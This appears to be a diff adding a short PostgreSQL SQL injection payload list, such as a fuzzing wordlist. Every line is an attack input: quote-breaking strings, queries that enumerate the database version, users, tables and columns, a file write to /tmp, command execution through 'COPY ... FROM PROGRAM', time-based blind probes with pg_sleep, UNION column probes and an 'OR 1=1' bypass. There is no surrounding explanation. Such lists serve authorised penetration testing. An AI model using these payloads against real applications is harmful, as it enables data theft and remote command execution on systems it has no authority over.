@@ -1,0 +1,15 @@
+'
+"
+'--
+SELECT version(), current_user, current_database();
+SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+COPY (SELECT 'malicious') TO '/tmp/test';
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'id';
+SELECT * FROM shell;
+SELECT pg_sleep(5);
+' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' OR 1=1--
